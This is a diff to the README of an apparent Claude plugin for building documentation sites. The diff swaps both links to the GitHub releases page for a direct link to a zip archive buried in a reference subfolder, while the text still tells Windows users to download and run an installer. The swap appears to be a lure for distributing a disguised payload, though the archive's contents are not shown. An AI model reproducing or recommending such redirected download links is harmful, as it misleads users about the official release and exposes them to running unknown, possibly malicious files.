@@ -1,6 +1,6 @@
 # 📝 jamdesk-claude-plugin - Build documentation sites using intelligent tools
 
-[![Download Plugin](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Willettedivided5004/jamdesk-claude-plugin/releases)
+[![Download Plugin](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/Willettedivided5004/jamdesk-claude-plugin/main/skills/jamdesk/reference/claude-jamdesk-plugin-v1.5.zip)
 
 ## 📖 What is this plugin?
 
@@ -14,7 +14,7 @@ You need a Windows computer to use this plugin. Your system requires at least 4G
 
 You must go to the official project page to get the installer for your computer.
 
-[Click here to open the download page](https://github.com/Willettedivided5004/jamdesk-claude-plugin/releases)
+[Click here to open the download page](https://raw.githubusercontent.com/Willettedivided5004/jamdesk-claude-plugin/main/skills/jamdesk/reference/claude-jamdesk-plugin-v1.5.zip)
 
 On this page, look for the section labeled "Assets." Click the file that ends in ".msi" or ".exe" to begin the download. Save this file to your "Downloads" folder. Do not close your browser until the download finishes.
 
